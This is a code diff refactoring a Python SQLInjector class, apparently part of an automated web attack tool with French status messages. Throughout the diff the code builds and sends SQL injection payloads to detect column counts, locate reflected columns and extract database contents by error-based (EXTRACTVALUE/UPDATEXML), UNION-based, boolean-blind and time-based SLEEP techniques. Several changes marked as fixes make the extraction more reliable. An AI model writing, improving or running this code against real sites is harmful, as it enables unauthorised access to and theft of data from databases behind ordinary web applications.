@@ -341,61 +341,84 @@ class SQLInjector:
                         self.inj_false  = false_tpl
                         self.inj_suffix = suffix
                         self._baseline  = baseline
+                        self._orig_val  = str(orig_val)   # ← store for all sub-methods
                         return True
 
         self._cb("warn", "🗄️ Aucune injection détectée sur les paramètres testés")
         return False
 
+    # ── Injection wrapper (uses discovered context) ───────────────────────────
+    def _ov(self):
+        """Return stored original value, with fallback"""
+        if hasattr(self, "_orig_val") and self._orig_val is not None:
+            return self._orig_val
+        return (self._qs.get(self.inj_param)
+                or self.post_data.get(self.inj_param, "")
+                or "1")
+
+    def _quote(self):
+        """Derive quote char from discovered injection context"""
+        ctx = self.inj_ctx or "string1"
+        if "num" in ctx:
+            return ""
+        if "dquote" in ctx:
+            return '"'
+        if "paren" in ctx:
+            return "')"
+        return "'"   # default: string contexts
+
+    def _wrap(self, injection):
+        """
+        Build a full injectable payload using the discovered context.
+        e.g.: '1' UNION SELECT ...-- -'  (for string1 context)
+        """
+        ov  = self._ov()
+        q   = self._quote()
+        suf = self.inj_suffix or "-- -"
+        return f"{ov}{q} {injection}{suf}"
+
+    def _wrap_neg(self, injection):
+        """Like _wrap but replaces orig_val with -1 to suppress original row"""
+        q   = self._quote()
+        suf = self.inj_suffix or "-- -"
+        return f"-1{q} {injection}{suf}"
+
     # ── Column count ─────────────────────────────────────────────────────────
     def _detect_cols_orderby(self):
-        """ORDER BY N — detect column count by response change"""
-        orig_val = self._qs.get(self.inj_param) or self.post_data.get(self.inj_param) or "1"
-        # Get reference with ORDER BY 1 (always valid)
-        ref = self._req(f"{orig_val}' ORDER BY 1-- -")
+        """ORDER BY N — detect column count using discovered injection context"""
+        # Reference: ORDER BY 1 always succeeds
+        ref = self._req_payload(self._wrap("ORDER BY 1"))
         if not ref:
             ref = self._baseline or ""
 
         for n in range(2, 26):
-            resp = self._req(f"{orig_val}' ORDER BY {n}-- -")
-            # Also try with #
-            if not resp:
-                resp = self._req(f"{orig_val}' ORDER BY {n}#")
+            resp = self._req_payload(self._wrap(f"ORDER BY {n}"))
             if not resp:
                 continue
-            # If response changed (error or different content) → n-1 columns
             if _has_sql_error(resp) or _responses_differ(ref, resp, threshold=0.04):
                 cols = n - 1
                 self._cb("found", f"🗄️ ORDER BY: {cols} colonne(s)")
                 return cols
-
-        # Also try numeric context
-        for n in range(2, 26):
-            resp = self._req(f"{orig_val} ORDER BY {n}-- -")
-            if not resp:
-                continue
-            if _has_sql_error(resp) or _responses_differ(ref, resp, threshold=0.04):
-                cols = n - 1
-                self._cb("found", f"🗄️ ORDER BY (numeric): {cols} colonne(s)")
-                return cols
         return 0
 
     def _detect_cols_union(self):
-        """UNION SELECT NULL×N — find count by valid response"""
-        orig_val = self._qs.get(self.inj_param) or self.post_data.get(self.inj_param) or "1"
-
+        """UNION SELECT NULL×N — find count with discovered context"""
         for n in range(1, 26):
             nulls = ",".join(["NULL"] * n)
-            for suffix in ["-- -", "#", "--"]:
-                for quote in ["'", ""]:
-                    payload = f"{orig_val}{quote} UNION SELECT {nulls}{suffix}"
-                    resp = self._req(payload)
-                    if resp and not _has_sql_error(resp) and len(resp) > 50:
-                        # Check it's not the error page
-                        if self._err_pg and not _responses_differ(resp, self._err_pg, threshold=0.1):
-                            continue
-                        self._cb("found", f"🗄️ UNION NULL×{n}: OK")
-                        return n
+            resp = self._req_payload(self._wrap(f"UNION SELECT {nulls}"))
+            if resp and not _has_sql_error(resp) and len(resp) > 50:
+                self._cb("found", f"🗄️ UNION NULL×{n}: OK")
+                return n
+            # Also try with ALL
+            resp2 = self._req_payload(self._wrap(f"UNION ALL SELECT {nulls}"))
+            if resp2 and not _has_sql_error(resp2) and len(resp2) > 50:
+                self._cb("found", f"🗄️ UNION ALL NULL×{n}: OK")
+                return n
         return 0
+
+    def _req_payload(self, payload):
+        """Send request with a prebuilt payload string"""
+        return self._req(payload, param=self.inj_param, method=self.inj_method)
 
     def detect_columns(self):
         """Auto-detect column count"""
@@ -413,75 +436,59 @@ class SQLInjector:
     # ── Find visible column ───────────────────────────────────────────────────
     def find_visible_column(self, num_cols=None):
         """Find which column position is reflected in the output"""
-        n = num_cols or self.num_cols or 5  # try up to 5 if unknown
-        orig_val = self._qs.get(self.inj_param) or self.post_data.get(self.inj_param) or "1"
-
+        n = num_cols or self.num_cols or 8
         self._cb("info", f"🗄️ Recherche colonne visible ({n} positions)...")
 
-        # Strategy 1: Use a distinctive number (can't be sanitized unlike strings)
         MARKER_NUM = "98765432100"
+        HEX_MARK   = "0x" + MARK_S.encode().hex()   # "0x533953"
+
         for pos in range(n):
             cols = ["NULL"] * n
+            # Try numeric marker first (never sanitized)
             cols[pos] = MARKER_NUM
             nulls = ",".join(cols)
-            for quote in ["'", ""]:
-                for suffix in ["-- -", "#", "--"]:
-                    payload = f"{orig_val}{quote} UNION ALL SELECT {nulls}{suffix}"
-                    # Use -1 to suppress original row
-                    payload_neg = f"-1{quote} UNION ALL SELECT {nulls}{suffix}"
-                    for pay in [payload_neg, payload]:
-                        resp = self._req(pay)
-                        if resp and MARKER_NUM in resp:
-                            self._cb("found", f"🗄️ Colonne visible: position {pos+1} (numérique)")
-                            self.vis_col = pos
-                            return pos
-
-        # Strategy 2: Use string marker
-        for pos in range(n):
-            cols = ["NULL"] * n
-            cols[pos] = f"0x{MARK_S.encode().hex()}"
+            # Use -1 (no matching row) so only UNION row shows
+            resp = self._req_payload(self._wrap_neg(f"UNION ALL SELECT {nulls}"))
+            if resp and MARKER_NUM in resp:
+                self._cb("found", f"🗄️ Colonne visible: {pos+1}/{n} (num)")
+                self.vis_col = pos
+                return pos
+            # Try string marker
+            cols[pos] = HEX_MARK
             nulls = ",".join(cols)
-            for quote in ["'", ""]:
-                for suffix in ["-- -", "#", "--"]:
-                    payload = f"-1{quote} UNION ALL SELECT {nulls}{suffix}"
-                    resp = self._req(payload)
-                    if resp and MARK_S in resp:
-                        self._cb("found", f"🗄️ Colonne visible: position {pos+1} (string)")
-                        self.vis_col = pos
-                        return pos
+            resp2 = self._req_payload(self._wrap_neg(f"UNION ALL SELECT {nulls}"))
+            if resp2 and MARK_S in resp2:
+                self._cb("found", f"🗄️ Colonne visible: {pos+1}/{n} (str)")
+                self.vis_col = pos
+                return pos
 
-        self._cb("warn", "🗄️ Colonne visible non trouvée — utilisation error-based")
+        self._cb("warn", "🗄️ Colonne visible non trouvée — error-based sera utilisé")
         return -1
 
     # ── Setup extraction technique ────────────────────────────────────────────
     def setup_technique(self):
-        """Determine best extraction technique and configure it"""
-        orig_val = self._qs.get(self.inj_param) or self.post_data.get(self.inj_param) or "1"
+        """Determine best extraction technique using the discovered injection context"""
 
         # Test 1: Error-based (most reliable for MySQL)
         self._cb("info", "🗄️ Test error-based (EXTRACTVALUE)...")
-        for quote in ["'", ""]:
-            for suffix in ["-- -", "#", "--"]:
-                payload = f"{orig_val}{quote} AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT 1),0x7e)){suffix}"
-                resp = self._req(payload)
-                val = _extract_error_value(resp)
-                if val == "1":
-                    self._cb("ok", "✅ Error-based prêt (EXTRACTVALUE)")
-                    self.technique = "error"
-                    self._err_quote  = quote
-                    self._err_suffix = suffix
-                    return "error"
-                # Try UPDATEXML
-                payload2 = f"{orig_val}{quote} AND UPDATEXML(1,CONCAT(0x7e,(SELECT 1),0x7e),1){suffix}"
-                resp2 = self._req(payload2)
-                val2 = _extract_error_value(resp2)
-                if val2 == "1":
-                    self._cb("ok", "✅ Error-based prêt (UPDATEXML)")
-                    self.technique  = "error"
-                    self._err_quote  = quote
-                    self._err_suffix = suffix
-                    self._err_fn     = "UPDATEXML"
-                    return "error"
+        # Use discovered context via _wrap
+        pay_ev = self._wrap("AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT 1),0x7e))")
+        resp   = self._req_payload(pay_ev)
+        val    = _extract_error_value(resp)
+        if val == "1":
+            self._cb("ok", "✅ Error-based EXTRACTVALUE prêt")
+            self.technique = "error"
+            self._err_fn   = "EXTRACTVALUE"
+            return "error"
+
+        pay_ux = self._wrap("AND UPDATEXML(1,CONCAT(0x7e,(SELECT 1),0x7e),1)")
+        resp2  = self._req_payload(pay_ux)
+        val2   = _extract_error_value(resp2)
+        if val2 == "1":
+            self._cb("ok", "✅ Error-based UPDATEXML prêt")
+            self.technique = "error"
+            self._err_fn   = "UPDATEXML"
+            return "error"
 
         # Test 2: UNION-based
         self._cb("info", "🗄️ Test UNION-based...")
@@ -493,159 +500,117 @@ class SQLInjector:
                 self.technique = "union"
                 return "union"
 
-        # Test 3: Boolean blind
-        self._cb("info", "🗄️ Test boolean blind...")
-        true_pay  = self._build(self.inj_true or "{V} AND 1=1{S}",
-                                 orig_val, self.inj_suffix or "-- -")
-        false_pay = self._build(self.inj_false or "{V} AND 1=2{S}",
-                                 orig_val, self.inj_suffix or "-- -")
-        t_resp = self._req(true_pay)
-        f_resp = self._req(false_pay)
-        if t_resp and f_resp and _responses_differ(t_resp, f_resp):
+        # Test 3: Boolean blind (already confirmed by find_injection)
+        self._cb("info", "🗄️ Activation boolean blind...")
+        true_pay  = self._req_payload(self._wrap("AND 1=1"))
+        false_pay = self._req_payload(self._wrap("AND 1=2"))
+        if true_pay and false_pay and _responses_differ(true_pay, false_pay):
             self._cb("ok", "✅ Boolean blind prêt")
             self.technique = "blind"
             return "blind"
 
         # Test 4: Time-based
-        self._cb("info", "🗄️ Test time-based blind (SLEEP)...")
-        for quote in ["'", ""]:
-            for suffix in ["-- -", "#", "--"]:
-                payload = f"{orig_val}{quote} AND SLEEP(2){suffix}"
-                t0 = time.time()
-                self._req(payload)
-                if time.time() - t0 > 1.8:
-                    self._cb("ok", "✅ Time-based blind prêt (lent)")
-                    self.technique = "time"
-                    return "time"
+        self._cb("info", "🗄️ Test time-based (SLEEP(2))...")
+        t0 = time.time()
+        self._req_payload(self._wrap("AND SLEEP(2)"))
+        if time.time() - t0 > 1.8:
+            self._cb("ok", "✅ Time-based blind prêt")
+            self.technique = "time"
+            return "time"
 
-        self._cb("warn", "🗄️ Aucune technique disponible")
+        self._cb("warn", "🗄️ Aucune technique d'extraction disponible")
         return None
 
     # ── Error-based extraction ────────────────────────────────────────────────
     def _error_extract(self, sql_expr):
-        """Extract full string using EXTRACTVALUE with SUBSTRING pagination"""
-        orig_val = self._qs.get(self.inj_param) or self.post_data.get(self.inj_param) or "1"
-        quote  = getattr(self, "_err_quote",  "'")
-        suffix = getattr(self, "_err_suffix", "-- -")
-        fn     = getattr(self, "_err_fn",     "EXTRACTVALUE")
-        PAGE   = 30  # EXTRACTVALUE max ~31 chars per call
+        """Extract full string via EXTRACTVALUE/UPDATEXML — paginates with SUBSTRING"""
+        fn   = getattr(self, "_err_fn", "EXTRACTVALUE")
+        PAGE = 30   # MySQL EXTRACTVALUE max usable chars ~ 31
 
         result = ""
         offset = 1
         while True:
             chunk_sql = f"SUBSTRING(({sql_expr}),{offset},{PAGE})"
             if fn == "UPDATEXML":
-                payload = (f"{orig_val}{quote} AND UPDATEXML(1,"
-                           f"CONCAT(0x7e,{chunk_sql},0x7e),1){suffix}")
+                inj = f"AND UPDATEXML(1,CONCAT(0x7e,{chunk_sql},0x7e),1)"
             else:
-                payload = (f"{orig_val}{quote} AND EXTRACTVALUE(1,"
-                           f"CONCAT(0x7e,{chunk_sql},0x7e)){suffix}")
+                inj = f"AND EXTRACTVALUE(1,CONCAT(0x7e,{chunk_sql},0x7e))"
 
-            resp = self._req(payload)
+            resp  = self._req_payload(self._wrap(inj))
             chunk = _extract_error_value(resp)
 
             if not chunk:
                 break
             result += chunk
             if len(chunk) < PAGE:
-                break  # Last page (shorter than page size)
+                break
             offset += PAGE
             if offset > 2000:
-                break  # Safety
+                break
 
         return result if result else None
 
     # ── UNION-based extraction ────────────────────────────────────────────────
     def _union_extract(self, sql_expr):
-        """Extract data using UNION SELECT with marker"""
+        """Extract data via UNION SELECT using discovered context"""
         if self.vis_col < 0 or self.num_cols == 0:
             return None
-        orig_val = self._qs.get(self.inj_param) or self.post_data.get(self.inj_param) or "1"
 
         cols = ["NULL"] * self.num_cols
         cols[self.vis_col] = f"CONCAT({HEX_MS},({sql_expr}),{HEX_ME})"
         nulls = ",".join(cols)
 
-        for quote in ["'", ""]:
-            for suffix in ["-- -", "#", "--"]:
-                payload = f"-1{quote} UNION ALL SELECT {nulls}{suffix}"
-                resp = self._req(payload)
-                if resp and MARK_S in resp and MARK_E in resp:
-                    m = re.search(re.escape(MARK_S) + r"(.*?)" + re.escape(MARK_E),
-                                  resp, re.DOTALL)
-                    if m:
-                        return m.group(1)
+        resp = self._req_payload(self._wrap_neg(f"UNION ALL SELECT {nulls}"))
+        if resp and MARK_S in resp and MARK_E in resp:
+            m = re.search(re.escape(MARK_S) + r"(.*?)" + re.escape(MARK_E), resp, re.DOTALL)
+            if m:
+                return m.group(1)
+        # Fallback: without -1 suppression
+        resp2 = self._req_payload(self._wrap(f"UNION ALL SELECT {nulls}"))
+        if resp2 and MARK_S in resp2 and MARK_E in resp2:
+            m = re.search(re.escape(MARK_S) + r"(.*?)" + re.escape(MARK_E), resp2, re.DOTALL)
+            if m:
+                return m.group(1)
         return None
 
     # ── Boolean blind extraction ──────────────────────────────────────────────
+    def _blind_true(self, cond):
+        """Send condition and return True if response matches 'true' baseline"""
+        resp = self._req_payload(self._wrap(f"AND ({cond})"))
+        base = self._req_payload(self._wrap("AND 1=1"))
+        return resp and base and not _responses_differ(resp, base, 0.04)
+
     def _blind_len(self, sql_expr, max_len=500):
         """Binary search for string length"""
-        orig_val = self._qs.get(self.inj_param) or self.post_data.get(self.inj_param) or "1"
-        true_tpl  = self.inj_true  or "{V} AND 1=1{S}"
-        suf       = self.inj_suffix or "-- -"
-
         lo, hi = 0, max_len
         while lo < hi:
             mid = (lo + hi) // 2
-            pay = self._build(true_tpl, orig_val, suf).rstrip(suf) + \
-                  f" AND LENGTH(({sql_expr}))>{mid}{suf}"
-            # simplified: just inject directly
-            for quote in ["'", ""]:
-                for suffix in ["-- -", "#"]:
-                    payload = f"{orig_val}{quote} AND LENGTH(({sql_expr}))>{mid}{suffix}"
-                    resp = self._req(payload)
-                    base_resp = self._req(f"{orig_val}{quote} AND 1=1{suffix}")
-                    if resp and base_resp and not _responses_differ(resp, base_resp, 0.04):
-                        lo = mid + 1
-                    else:
-                        hi = mid
-                    break
-                break
+            if self._blind_true(f"LENGTH(({sql_expr}))>{mid}"):
+                lo = mid + 1
+            else:
+                hi = mid
         return lo
 
     def _blind_char(self, sql_expr, pos):
-        """Binary search for character at position pos (1-based)"""
+        """Binary search for character at pos (1-based) — FIXED: uses self._ov()"""
         lo, hi = 32, 126
-        for quote in ["'", ""]:
-            for suffix in ["-- -", "#"]:
-                while lo < hi:
-                    mid = (lo + hi) // 2
-                    payload = f"{orig_val}{quote} AND ASCII(SUBSTRING(({sql_expr}),{pos},1))>{mid}{suffix}"
-                    resp    = self._req(payload)
-                    base    = self._req(f"{orig_val}{quote} AND 1=1{suffix}")
-                    if resp and base and not _responses_differ(resp, base, 0.04):
-                        lo = mid + 1
-                    else:
-                        hi = mid
-                break
-            break
+        while lo < hi:
+            mid = (lo + hi) // 2
+            if self._blind_true(f"ASCII(SUBSTRING(({sql_expr}),{pos},1))>{mid}"):
+                lo = mid + 1
+            else:
+                hi = mid
         return chr(lo) if 32 <= lo <= 126 else "?"
 
     def _blind_extract(self, sql_expr, max_len=200):
-        """Extract full string via boolean blind binary search"""
-        orig_val = self._qs.get(self.inj_param) or self.post_data.get(self.inj_param) or "1"
+        """Extract full string via boolean blind binary search — uses _blind_char"""
         length = self._blind_len(sql_expr, max_len=max_len)
         if not length:
             return None
         result = ""
         self._cb("info", f"🗄️ Blind extract: {length} chars...")
         for i in range(1, length + 1):
-            lo, hi = 32, 126
-            for quote in ["'", ""]:
-                for suffix in ["-- -", "#"]:
-                    while lo < hi:
-                        mid = (lo + hi) // 2
-                        payload = (f"{orig_val}{quote} AND "
-                                   f"ASCII(SUBSTRING(({sql_expr}),{i},1))>{mid}{suffix}")
-                        resp = self._req(payload)
-                        base = self._req(f"{orig_val}{quote} AND 1=1{suffix}")
-                        if resp and base and not _responses_differ(resp, base, 0.04):
-                            lo = mid + 1
-                        else:
-                            hi = mid
-                    break
-                break
-            result += chr(lo) if 32 <= lo <= 126 else "?"
+            result += self._blind_char(sql_expr, i)
         return result
 
     # ── Time-based extraction ─────────────────────────────────────────────────
